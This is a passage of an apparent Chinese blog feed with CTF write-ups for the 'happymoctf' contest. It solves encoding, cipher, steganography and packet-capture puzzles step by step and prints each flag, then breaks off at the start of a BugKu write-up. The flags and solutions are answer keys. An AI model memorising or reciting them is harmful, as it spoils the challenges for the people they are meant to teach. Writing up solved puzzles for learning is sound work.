class="line">4D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D</span><br></pre></td></tr></table></figure></p><p>全家桶应该指的是base16、base32、base64，直接用py可以解码，根据字符串特征选择解码方式，顺序是：<br>base16—-base32——base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; decode = base64.b16decode(b&apos;4D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;</span><br><span class="line">&gt;&gt;&gt; decode = base64.b32decode(b&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;</span><br><span class="line">&gt;&gt;&gt; decode = base64.b64decode(b&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;moctf&#123;Base_Quan_Jia_Tong&#125;&apos;</span><br></pre></td></tr></table></figure></p><h2 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h2><p>得到这样一串颜文字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure></p><p>直接放控制台，回车后就可以得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Yan_Wen_Zi&#125;</span><br></pre></td></tr></table></figure></p><h2 id="奇怪的十六进制"><a href="#奇怪的十六进制" class="headerlink" title="奇怪的十六进制"></a>奇怪的十六进制</h2><p>得到一串16进制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5a 45 64 6f 63 45 35 57 4f 48 68 6a 4d 54 6c 74 59 6b 64 46 4e 51 3d 3d</span><br></pre></td></tr></table></figure></p><p>转换成ASCII<br>转换地址：<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z E d o c E 5 W O H h j M T l t Y k d F N Q = =</span><br></pre></td></tr></table></figure></p><p>同样我们用python解码一下base64得到flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; decode = base64.b64decode(b&apos;ZEdocE5WOHhjMTltYkdFNQ==&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;dGhpNV8xc19mbGE5&apos;</span><br><span class="line">&gt;&gt;&gt; decode = base64.b64decode(b&apos;dGhpNV8xc19mbGE5&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;thi5_1s_fla9&apos;</span><br></pre></td></tr></table></figure></p><h2 id="先越过这道栅栏再说"><a href="#先越过这道栅栏再说" class="headerlink" title="先越过这道栅栏再说"></a>先越过这道栅栏再说</h2><p>我们得到字符串为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nzop0edv_u_1ggu&#123;1&#125;</span><br></pre></td></tr></table></figure></p><p>题目提示栅栏密码，我们用CTFcrackTools看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第2栏：npdug&#123;z0v_g1oe_1u&#125;</span><br></pre></td></tr></table></figure></p><p>再用凯撒密码解一下得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moctf&#123;y0u_f1nd_1t&#125;</span><br></pre></td></tr></table></figure></p><h2 id="空word"><a href="#空word" class="headerlink" title="空word"></a>空word</h2><p>得到一个空的word文本，这里想到前天刚做的Bugku的题目也是类似，通过显示全部格式标记，我们可以看到一些符号<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/nothing.png" alt="抓包结果"><br>猜测是摩斯密码，我们整理出来后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -..</span><br></pre></td></tr></table></figure></p><p>解密后得到十六进制，转成ASCII后，得到flag。<br>转换地址：<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6D6F6374667B426C346E6B5F30725F7461623F7D</span><br><span class="line"></span><br><span class="line">moctf&#123;Bl4nk_0r_tab?&#125;</span><br></pre></td></tr></table></figure></p><h2 id="一万年的爱有多久"><a href="#一万年的爱有多久" class="headerlink" title="一万年的爱有多久"></a>一万年的爱有多久</h2><p>下载后得到一个压缩包，试着解压后，还是压缩包，结合题目应该是要不断解压才能看到flag，这里直接用python脚本来实现解压缩包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">for i in range(10000):</span><br><span class="line">file_list = os.listdir(r&apos;.&apos;)</span><br><span class="line">for file_name in file_list:</span><br><span class="line">    if os.path.splitext(file_name)[1] == &apos;.zip&apos;:</span><br><span class="line"></span><br><span class="line">        file_zip = zipfile.ZipFile(file_name, &apos;r&apos;)</span><br><span class="line">        for file in file_zip.namelist():</span><br><span class="line">            file_zip.extract(file, r&apos;.&apos;)</span><br><span class="line">        file_zip.close()</span><br><span class="line">        os.remove(file_name)</span><br></pre></td></tr></table></figure></p><p>解压完得到flag文件，用编辑器打开可得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Just_a_few_minutes&#125;</span><br></pre></td></tr></table></figure></p><h2 id="是兄弟就来干我"><a href="#是兄弟就来干我" class="headerlink" title="是兄弟就来干我"></a>是兄弟就来干我</h2><p>得到一张tanwanlanyue.png和一个压缩包,用binwalk看了一下都没东西，用Stegsolve打开，试了一下lsb隐写，在BGR排序下看到是一张png图片<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/lsb.png" alt="lsb"></p><p>我们把他保存成bin文件，然后用winhex打开，发现文件头不对，删掉多余的字符，然后保存<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/winhex.png" alt="winhex"></p><p>得到一张图片<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/zhazhahui.png" alt="zhazhahui"></p><p>我们猜测压缩包密码就是图片上用红点表示的内容(zhazhahui)，发现能打开压缩包，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_hfv7m_y8&#123;kThk43a_xrk0?n&#125;</span><br></pre></td></tr></table></figure></p><p>先用栅栏密码解密，再用凯撒密码解密可得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第1栏：fhvmy&#123;Tk3_r0n_f7_8kh4axk?&#125;</span><br><span class="line">第2栏：fh_kh4f3va7_mx_ryk80&#123;?knT&#125;</span><br><span class="line">使用第一栏进行凯撒解密</span><br><span class="line">moctf&#123;Ar3_y0u_m7_8ro4her?&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker!!!"></a>Hacker!!!</h2><p>得到一个流量包，用wireshark查看后发现是以一个注入的流量，这里参考了<a href="https://www.hexlt.org/archives/27/" target="_blank" rel="noopener">cankao1</a>这篇文章，先导出http对象，然后分析是盲注，当长度1326时正确，所以把一个一个把返回正常所对应的ASCII编码后的数字找出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">109 111 99 116 102 123 72 116 116 112 95 49 115 95 100 52 110 103 51 114 73 48 117 53 125</span><br></pre></td></tr></table></figure></p><p>对着ASCII表解码一下可以得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;Http_1s_d4ng3rI0u5&#125;</span><br></pre></td></tr></table></figure></p><h2 id="李华的疑惑"><a href="#李华的疑惑" class="headerlink" title="李华的疑惑"></a>李华的疑惑</h2><p>得到一个压缩包，解压后有一个压缩包和一个password.txt，password.txt有规律的排列,均为3个一组，一共22500行<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/password.png" alt="密码"></p><p>这里想到可能是代表RGB三个通道，可以试着能不能按照150X150还原图片，这里参考了<a href="http://blog.csdn.net/ssjjtt1997/article/details/78450816" target="_blank" rel="noopener">http://blog.csdn.net/ssjjtt1997/article/details/78450816</a><br>使用python的PIL进行图片还原<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">x = 150    #x坐标  通过对txt里的行数进行整数分解</span><br><span class="line">y = 150    #y坐标  x * y = 行数</span><br><span class="line"></span><br><span class="line">im = Image.new(&quot;RGB&quot;, (x, y))   #创建图片</span><br><span class="line">file = open(&apos;password.txt&apos;)    #打开rbg值的文件</span><br><span class="line"></span><br><span class="line">#通过每个rgb点生成图片</span><br><span class="line"></span><br><span class="line">for i in range(0, x):</span><br><span class="line">    for j in range(0, y):</span><br><span class="line">        line = file.readline()  #获取一行的rgb值</span><br><span class="line">        rgb = line.split(&quot;,&quot;)  #分离rgb，文本中逗号后面有空格</span><br><span class="line">        im.putpixel((i,j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))    #将rgb转化为像素</span><br><span class="line"></span><br><span class="line">im.save(&apos;flag.jpg&apos;)</span><br></pre></td></tr></table></figure></p><p>得到flag.jpg<br><img src="/2018/02/13/happy-moctf-新春欢乐赛/flagjpg.png" alt="flagjpg"></p><p>得到密码解开压缩包得到字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18R9EylBVacP/j0XpCISh9nZth6TFwoh5GUv0edeVp3ZV9gXVqd/rlH66OIZgSHn2Mock4hcdqFEg==</span><br></pre></td></tr></table></figure></p><p>试了一下base64，发现不行，这里想到之前好像见过类似的使用AES进行解密，这里一个在线解密地址<br><a href="http://tool.oschina.net/encrypt" target="_blank" rel="noopener">http://tool.oschina.net/encrypt</a>来解密，可以得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:moctf&#123;D0_You_1ik3_tO_pAinH_wi4h_pi8e1&#125;</span><br></pre></td></tr></table></figure></p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h2><p>题目问的是集五福能平分多少钱，打开支付宝开了一下，发现是五亿，结合题目的提示，可得flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: moctf&#123;500000000&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;辞旧迎新，离新年没剩几天了，这次是我们自己学校的新春欢乐赛（happymoctf），又来划了一波水。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不得不佩服学弟们做的首页，秀的我这个老年人头皮发麻&lt;br&gt;&lt;img src=&quot;/2018/02/13/happy-moctf
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>BugKu新赛季（持续更新）</title>
    <link href="http://ju5tw4nty0u.top/2018/02/11/BugKu%E6%96%B0%E8%B5%9B%E5%AD%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/02/11/BugKu新赛季（持续更新）/</id>
    <published>2018-02-11T05:00:00.000Z</published>
    <updated>2018-02-11T18:34:05.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BugKu新赛季"><a href="#BugKu新赛季" class="headerlink" title="BugKu新赛季"></a>BugKu新赛季</h1><p>题目地址：<a href="http://ctf.bugku.com/challenges" target="_blank" rel="noopener">http://ctf.bugku.com/challenges</a></p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>关注BugKu的微信公众号即可获取flag；</p><h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>下载图片用winhex打开，可以看到末尾有一段奇怪的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</span><br></pre></td></tr></table></figure></p><p>第一直觉用ASCII表来对照一下，发现就是我们所要的flag；</p><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p>首先打开图片看一下，发现像素是500X420，这里想到可能是png像素隐写，这里参考余老师的一篇文章<br><a href="http://blog.csdn.net/saltyfish_yuch/article/details/78429431" target="_blank" rel="noopener">png像素隐写</a><br>我们用winhex将像素调整为500X500后，可以在图片下方得到我们所要的flag；</p><h3 id="telnet"><a href="#telnet" class="headerlink" 